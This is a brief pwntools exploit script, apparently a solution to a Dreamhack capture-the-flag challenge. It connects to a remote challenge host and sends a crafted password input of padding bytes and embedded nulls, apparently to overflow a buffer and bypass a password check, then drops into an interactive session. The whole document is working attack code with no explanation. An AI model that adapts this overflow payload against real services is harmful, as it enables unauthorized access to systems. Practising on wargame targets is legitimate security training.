# _ZN4prob4main17h5c6c2c95bc71f04bE
from pwn import *
context.log_level="debug"
#r = process("./prob")
r = remote("host3.dreamhack.games", 21218)
#gdb.attach(r)
r.sendlineafter(b"Password >> ", b"A"*16+b"\x00\x00"+b"A"*64)
r.interactive()